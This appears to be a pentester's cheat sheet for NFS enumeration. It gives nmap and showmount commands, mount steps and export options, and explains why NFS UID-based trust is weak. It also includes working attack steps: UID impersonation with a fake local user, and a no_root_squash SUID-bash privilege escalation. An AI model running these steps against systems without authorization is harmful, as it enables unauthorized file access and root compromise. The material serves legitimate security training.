
# NFS Tools Reference

Quick command reference for NFS enumeration. For theory, workflow, and what to look for, see [[01-Recon/Infrastructure/NFS-Enumeration|NFS Enumeration]].

Ports: `2049` (TCP/UDP), `111` (TCP/UDP rpcbind)

---

## Nmap

```bash
# Service scan on NFS ports
sudo nmap -sV -sC -p111,2049 <target>

# All NFS NSE scripts (ls, showmount, statfs, rpcinfo)
sudo nmap --script nfs* -sV -p111,2049 <target>
```

Key scripts:

| Script | What It Does |
|--------|-------------|
| `nfs-ls` | Lists share contents and permissions without mounting |
| `nfs-showmount` | Shows available exports and allowed client ranges |
| `nfs-statfs` | Returns filesystem stats (size, used, available) |
| `rpcinfo` | Lists all running RPC services with ports and versions |

---

## showmount

```bash
# List available exports
showmount -e <target>
```

---

## Mount / Unmount

```bash
# Create mount point and mount
mkdir target-NFS
sudo mount -t nfs <target>:/ ./target-NFS/ -o nolock

# Inspect contents
ls -l ./target-NFS/mnt/nfs/   # names
ls -n ./target-NFS/mnt/nfs/   # raw UIDs/GIDs

# Tree view
tree ./target-NFS

# Unmount
cd ..
sudo umount ./target-NFS
```

---

## UID Impersonation

```bash
# Create local user matching remote file owner UID
sudo useradd -u <uid> fakeuser
sudo su fakeuser

# Now access files on the mounted share as that UID
```

---

## no_root_squash SUID Privesc

```bash
# On attack machine (as root), with share mounted
cp /bin/bash ./target-NFS/mnt/nfs/shell
chmod +s ./target-NFS/mnt/nfs/shell

# On target (via SSH)
/mnt/nfs/shell -p    # -p preserves EUID
```

Only works when `no_root_squash` is set on the export.

---

## NFS Versions

| Version | Key Features |
|---------|-------------|
| NFSv2 | Legacy. Originally UDP only. |
| NFSv3 | Variable file sizes, better error reporting. |
| NFSv4 | Kerberos support, stateful, ACLs, single port 2049 (no portmapper needed). First version to authenticate users rather than just the client machine. |
| NFSv4.1 | Adds pNFS (parallel NFS) and session trunking (multipathing). |

---

## How Authentication Works

NFS delegates authentication to RPC using UNIX UID/GID:

- The server trusts the UID/GID the client presents
- Maps those IDs to local users and applies filesystem permissions
- No server-side verification that the client's UID mapping is legitimate
- NFSv4 with Kerberos is the only version that actually authenticates users

This is why NFS should only be used on trusted internal networks, and why UID mismatches are a common privilege escalation vector.

---

## Configuration

Config file: `/etc/exports`

```bash
cat /etc/exports
```

### Export Options

| Option | Description |
|--------|-------------|
| `rw` | Read and write permissions |
| `ro` | Read only |
| `sync` | Synchronous transfer (slower, safer) |
| `async` | Asynchronous transfer (faster, less safe) |
| `secure` | Restrict to ports below 1024 |
| `insecure` | Allow ports above 1024 |
| `no_subtree_check` | Disable subdirectory tree checking |
| `root_squash` | Remap remote root (UID 0) to anonymous user |
| `no_root_squash` | Remote root retains UID 0 on the share |

### Apply Changes

```bash
echo '/mnt/nfs  10.129.14.0/24(sync,no_subtree_check)' >> /etc/exports
systemctl restart nfs-kernel-server
exportfs    # verify active exports
```

---

## Dangerous Settings

| Option | Risk |
|--------|------|
| `rw` | Allows write access to the share |
| `insecure` | Any process (not just root) can connect |
| `no_root_squash` | Remote root retains UID 0 -- SUID privesc if writable |
| `nohide` | Exposes filesystems mounted below the exported directory |
